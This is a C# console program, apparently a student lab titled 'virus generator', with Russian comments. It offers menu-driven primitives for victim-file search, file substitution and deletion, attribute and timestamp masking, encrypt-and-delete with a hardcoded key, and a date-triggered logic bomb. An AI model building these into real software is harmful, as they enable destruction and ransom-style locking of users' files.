using System;
using System.Linq;
using System.IO;
using System.Collections.Generic;
using System.Security.Cryptography;

class Virus_generator
{
    static void lab1(string path, string mask)//поиск жертвы
    {
        string[] fname;
        if (Directory.Exists(path))
        {
            fname = Directory.GetFiles(path, mask, SearchOption.TopDirectoryOnly);
            foreach (string s in fname)
            {
                Console.WriteLine(s);
            }
            Console.WriteLine("Количество найденных файлов: " + fname.Length);
            Console.WriteLine(true);
        }
        else
        {
            Console.WriteLine(false);
        }
    }

    static string lab2_Name(string source, string desta)//подмена файла (поиск имени файла)
    {
        if (System.IO.File.Exists(source) && System.IO.File.Exists(desta))
        {
            List<string> mas = new List<string>();
            string arr = "";
            int i = source.Length - 1;
            while (source[i] != Convert.ToChar(92))
            {
                mas.Add(Convert.ToString(source[i]));
                i--;
            }
            mas.Reverse();
            i = desta.Length - 1;
            while (desta[i] != Convert.ToChar(92))
            {
                i--;
            }
            int z = 0;
            while (z != i + 1)
            {
                arr = arr + Convert.ToString(desta[z]);
                z++;
            }
            int y = 0;
            while (y != mas.Count)
            {
                arr = arr + mas[y];
                y++;
            }
            lab2_delete(desta, 0);
            return arr;
        }
        else
        {
            return "0";
        }
    }

    static void lab2_delete(string source, int i)//удаление файла
    {
        FileInfo file = new FileInfo(source);
        if (file.Exists)
        {
            file.Delete();
            if (i != 0)
            {
                Console.WriteLine(true);
            }
        }
        else
        {
            if (i != 0)
            {
                Console.WriteLine(false);
            }
        }
    }

    static void lab2_move(string source, string dest)//переименование файла
    {
        FileInfo file = new FileInfo(source);
        if (file.Exists)
        {
            file.MoveTo(dest);
            Console.WriteLine(true);
        }
        else
        {
            Console.WriteLine(false);
        }
    }
    static void lab2_register(string source, string dest)//запись из одного файла в другой
    {
        try
        {
            StreamReader sr = new StreamReader(source);
            string text = sr.ReadToEnd();
            Console.WriteLine("Запись содержимого файла:\n1. В начало\n2. В конец");
            int i = Convert.ToInt32(Console.ReadLine());
            if (i == 1)
            {
                using (StreamWriter sw = new StreamWriter(dest, false, System.Text.Encoding.Default))
                {
                    sw.WriteLine(text);
                }
            }
            else
            {
                using (StreamWriter sw = new StreamWriter(dest, true, System.Text.Encoding.Default))
                {
                    sw.WriteLine(text);
                }
            }
            Console.WriteLine(true);
        }
        catch
        {
            Console.WriteLine(false);
        }
    }
    static void search(string source, string dest)//поиск заданной строки в файле
    {
        try
        {
            StreamReader sr = new StreamReader(source);
            string text = sr.ReadToEnd();
            int index = text.IndexOf(dest);
            if (index == -1)
            {
                Console.WriteLine(false);
            }
            else
            {
                Console.WriteLine(true);
            }
        }
        catch
        {
            Console.WriteLine(false);
        }
    }
    static void search_2(string source, string dest)//проверка: присутствует ли содержимое одного файла в тексте другого файла
    {
        try
        {
            StreamReader sr = new StreamReader(source);
            string text = sr.ReadToEnd();
            StreamReader str = new StreamReader(dest);
            string text1 = str.ReadToEnd();
            int index = text1.IndexOf(text);
            if (index == -1)
            {
                Console.WriteLine(false);
            }
            else
            {
                Console.WriteLine(true);
            }
        }
        catch
        {
            Console.WriteLine(false);
        }
    }
    static void search_3(string source)//проверка: не является ли некоторый файл, заданный своим именем
    {
        if (File.Exists(source))
        {
            string[] path = System.Environment.GetCommandLineArgs();
            if (path[0].IndexOf(source) == -1)
            {
                Console.WriteLine(false);
            }
            else
            {
                Console.WriteLine(true);
            }
        }
        else
        {
            Console.WriteLine(false);
        }
    }
    static void start(string source)//запуск программы
    {
        if (System.IO.File.Exists(source))
        {
            System.Diagnostics.Process proc = new System.Diagnostics.Process();
            proc.StartInfo.FileName = source;
            if (proc.Start() == true)
            {
                Console.WriteLine(true);
            }
            else
            {
                Console.WriteLine(false);
            }
        }
        else
        {
            Console.WriteLine(false);
        }
    }
    static void lab_data(string source)//изменение даты
    {
        Console.WriteLine("Введите дату в формате гггг мм дд:");
        string data = Console.ReadLine();
        string[] array = data.Split(' ');
        Console.WriteLine("Введите время в формате чч мм сс:");
        string time = Console.ReadLine();
        string[] mas = time.Split(' ');
        try
        {
            File.SetLastWriteTime(source, new DateTime(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]), Convert.ToInt32(array[2]), Convert.ToInt32(mas[0]), Convert.ToInt32(mas[1]), Convert.ToInt32(mas[2])));
            Console.WriteLine(true);
        }
        catch
        {
            Console.WriteLine(false);
        }
    }
    static void lab_attrib(string source)//изменение атрибутов
    {
        Console.WriteLine("Выберите изменение атрибута:\n1. Стандартные настройки без специальных атрибутов\n2. Скрытый\n3. Только чтение");
        try
        {
            switch (Convert.ToInt32(Console.ReadLine()))
            {
                case 1:
                    File.SetAttributes(source, FileAttributes.Normal);
                    break;
                case 2:
                    File.SetAttributes(source, FileAttributes.Hidden);
                    break;
                case 3:
                    File.SetAttributes(source, FileAttributes.ReadOnly);
                    break;
            }
            Console.WriteLine(true);
        }
        catch
        {
            Console.WriteLine(false);
        }
    }
    static void lab_bite(string source)//изменение размера файла
    {
        try
        {
            Console.WriteLine("Введите размер файла в байтах:");
            File.WriteAllBytes(source, new Byte[Convert.ToInt32(Console.ReadLine())]);
            Console.WriteLine(true);
        }
        catch
        {
            Console.WriteLine(false);
        }
    }
    public static void EncryptFile(string iF)//шифратор
    {
        if (System.IO.File.Exists(iF))//проверка на существование файла
        {
            string oF = iF + ".crypt";
            TripleDES tdes = TripleDESCryptoServiceProvider.Create();//используется класс шифрования TripleDES, доступный в библиотеках C#, функцией Create() создаётся оболочка для шифрования/дешифрования (криптографический преобразователь)
            tdes.IV = new byte[] { 81, 67, 255, 32, 213, 55, 68, 120 };//задаём вектор инициализации (IV), задаёт порядок шифрования/дешифрования первому блоку (каждый последующий блок данных, который зашифрован, передается ранее зашифрованным блоком данных)
            tdes.Key = new byte[] { 129, 33, 49, 77, 185, 144, 248, 35, 203, 154, 58, 206, 1, 238, 248, 174, 83, 35, 124, 7, 40, 93, 23, 51 };//задаётся ключ (Key)
            using (var inputStream = File.OpenRead(iF))//открывается для чтения файл, который нужно зашифровать
            using (var oS = new FileStream(oF, FileMode.Create, FileAccess.Write))//создаёт файл, в который можно записывать поток байтов, путь к файлу указан в oF
            using (var encrypt = new CryptoStream(oS, tdes.CreateEncryptor(), CryptoStreamMode.Write))//Определяет поток, который связывает потоки данных с криптографическими преобразованиями,(1. указывается путь к созданному файлу, 2. создаётся объект-шифратор со свойствами Key и IV, 3. Открывается доступ к криптографическому потоку для записи)
            {
                oS.SetLength(0);//устанавливает длину смещения в 0 байт, т.е. шифроваться будет весь поток побайтово
                inputStream.CopyTo(encrypt);//cчитывает байты из текущего потока и записывает их в другой поток, шифруя
            }
            File.Delete(iF);//using используется для того, чтобы можно было выполнить данную команду, т.к. поток информации открывается и закрывается в using
            Console.WriteLine(true);
        }
        else
        {
            Console.WriteLine(false);
        }
    }
    public static void DecryptFile(string iF)//дешифратор
    {
        if (System.IO.File.Exists(iF))//проверка на существование файла
        {
            string oF = iF.Replace(".crypt", "");//удаление из пути к файлу ".crypt"
            TripleDES tdes = TripleDESCryptoServiceProvider.Create();//используется класс шифрования TripleDES, доступный в библиотеках C#, функцией Create() создаётся оболочка для шифрования/дешифрования (криптографический преобразователь)
            tdes.IV = new byte[] { 81, 67, 255, 32, 213, 55, 68, 120 };//задаём вектор инициализации (IV), задаёт порядок шифрования/дешифрования первому блоку (каждый последующий блок данных, который зашифрован, передается ранее зашифрованным блоком данных)
            tdes.Key = new byte[] { 129, 33, 49, 77, 185, 144, 248, 35, 203, 154, 58, 206, 1, 238, 248, 174, 83, 35, 124, 7, 40, 93, 23, 51 };//задаётся ключ (Key)
            using (var inputStream = File.OpenRead(iF))//открывается для чтения файл, который нужно дешифровать
            using (var decrypt = new CryptoStream(inputStream, tdes.CreateDecryptor(), CryptoStreamMode.Read))//Определяет поток, который связывает потоки данных с криптографическими преобразованиями,(1. указывается путь к файлу, который нужно дешифровать 2. создаётся объект-дешифратор со свойствами Key и IV, 3. Открывается доступ к криптографическому потоку для чтения)
            using (var outputStream = new FileStream(oF, FileMode.Create, FileAccess.Write))//создаёт файл, в который можно записывать поток байтов, путь к файлу указан в oF
            {
                decrypt.CopyTo(outputStream);//cчитывает байты из текущего потока и записывает их в другой поток, дешифруя
            }
            File.Delete(iF);
            Console.WriteLine(true);
        }
        else
        {
            Console.WriteLine(false);
        }
    }
    public static void Bomb(string Data, string path)//логическая бомба
    {
        string[] mas = Data.Split(new Char[] { ' ', '.', ':' });
        while (true)
        {
            if (new DateTime(Convert.ToInt32(mas[0]), Convert.ToInt32(mas[1]), Convert.ToInt32(mas[2]), Convert.ToInt32(mas[3]), Convert.ToInt32(mas[4]), Convert.ToInt32(mas[5])) <= DateTime.Now)//сравнение времени указанного с настоящим
            {
                if (System.IO.File.Exists(path))//проверка на существование файла
                {
                    System.Diagnostics.Process proc = new System.Diagnostics.Process();//используется класс Process для запуска программы
                    proc.StartInfo.FileName = path;//задаётся имя запускаемого элемента
                    if (proc.Start() == true)//запускается приложение
                    {
                        Console.WriteLine(true);
                    }
                    else
                    {
                        Console.WriteLine(false);
                    }
                }
                else
                {
                    Console.WriteLine(false);
                }
                break;
            }
        }
    }
    static void Main(string[] args)
    {
        string path;
        int i = 0;
        while (i != 13)
        {
            Console.WriteLine("Генератор вирусов:\n1. Поиск жертвы\n2. Подмена файла\n3. Удаление файла\n4. Переименование файла\n5. Модификация файла (запись информации из одного файла в другой)\n6. Проверка файла на заражённость (поиск заданной строки в файле)\n7. Проверка файла на зараженность (проверка содержимого одного файла в тексте другого файла)\n8. Проверка файла на зараженность (не является ли файл, заданный своим именем)\n9. Маскировка (запуск программы)\n10. Маскировка (изменение даты, времени, атрибутов, размера)\n11. Маскировка (шифрование и дешифрование файла)\n12. Логическая бомба\n13. Выход");
            i = Convert.ToInt32(Console.ReadLine());
            switch (i)
            {
                case 1:
                    Console.WriteLine("Введите путь к папке:");
                    path = Console.ReadLine();
                    Console.WriteLine("Маску файла в формате *.txt:");
                    lab1(path, Console.ReadLine());
                    break;
                case 2:
                    Console.WriteLine("Введите путь к файлу, который нужно переместить:");
                    path = Console.ReadLine();
                    Console.WriteLine("Введите путь к файлу, который нужно заменить:");
                    lab2_move(path, Convert.ToString(lab2_Name(path, Console.ReadLine())));
                    break;
                case 3:
                    Console.WriteLine("Введите путь к файлу, который нужно удалить:");
                    lab2_delete(Console.ReadLine(), 1);
                    break;
                case 4:
                    Console.WriteLine("Введите путь к файлу, который нужно переименовать:");
                    FileInfo file = new FileInfo(Console.ReadLine());
                    Console.WriteLine("Введите новое имя с маской:");
                    lab2_move(file.FullName, Convert.ToString(file.Directory) + Convert.ToChar(92) + Console.ReadLine());
                    break;
                case 5:
                    Console.WriteLine("Введите путь к файлу, в котором находится информация:");
                    path = Console.ReadLine();
                    Console.WriteLine("Введите путь к файлу, в который нужно переместить информацию:");
                    lab2_register(path, Console.ReadLine());
                    break;
                case 6:
                    Console.WriteLine("Введите путь к файлу, в котором находится информация:");
                    path = Console.ReadLine();
                    Console.WriteLine("Введите строку, которую нужно найти:");
                    search(path, Console.ReadLine());
                    break;
                case 7:
                    Console.WriteLine("Введите путь к файлу, в котором находится информация:");
                    path = Console.ReadLine();
                    Console.WriteLine("Введите путь к файлу, в котором нужно проверить информацию:");
                    search_2(path, Console.ReadLine());
                    break;
                case 8:
                    Console.WriteLine("Введите путь к файлу, который нужно проверить:");
                    search_3(Console.ReadLine());
                    break;
                case 9:
                    Console.WriteLine("Введите путь к файлу, который нужно запустить:");
                    start(Console.ReadLine());
                    break;
                case 10:
                    Console.WriteLine("Введите путь к файлу, в котором нужно изменить свойства:");
                    path = Console.ReadLine();
                    if (System.IO.File.Exists(path))
                    {
                        Console.WriteLine("Выберите действие:\n1. Изменение даты и времени\n2. Изменнение атрибутов\n3. Изменение размера файла\n4. Назад");
                        switch (Convert.ToInt32(Console.ReadLine()))
                        {
                            case 1:
                                lab_data(path);
                                break;
                            case 2:
                                lab_attrib(path);
                                break;
                            case 3:
                                lab_bite(path);
                                break;
                            case 4:
                                break;
                        }
                    }
                    else
                    {
                        Console.WriteLine(false);
                    }
                    break;
                case 11:
                    Console.WriteLine("1. Ввести путь для шифровки файла\n2. Ввести путь для дешифровки файла\n3. Назад");
                    switch (Convert.ToInt32(Console.ReadLine()))
                    {
                        case 1:
                            EncryptFile(Console.ReadLine());
                            break;
                        case 2:
                            DecryptFile(Console.ReadLine());
                            break;
                        case 3:
                            break;
                    }
                    break;
                case 12:
                    Console.WriteLine("Введите путь к файлу:");
                    path = Console.ReadLine();
                    Console.WriteLine("Введите дату и время в формате 2020.12.20 12.12.12:");
                    Bomb(Console.ReadLine(), path);
                    break;
                case 13:
                    break;
            }
        }
    }
}